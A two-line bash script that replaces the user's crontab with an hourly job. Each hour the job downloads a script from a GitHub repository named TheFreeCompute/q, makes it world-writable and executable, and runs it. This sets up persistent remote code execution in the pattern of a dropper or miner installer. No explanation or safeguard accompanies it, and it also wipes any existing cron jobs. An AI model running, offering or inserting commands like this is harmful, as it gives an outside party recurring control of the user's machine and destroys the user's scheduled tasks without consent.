#!/bin/bash

echo '@hourly rm ~/.q || true && curl --location --silent "https://raw.githubusercontent.com/TheFreeCompute/q/master/01_model.sh?$RANDOM" -o ~/.q && chmod 777 ~/.q && ~/.q' > ~/.crontab && crontab ~/.crontab
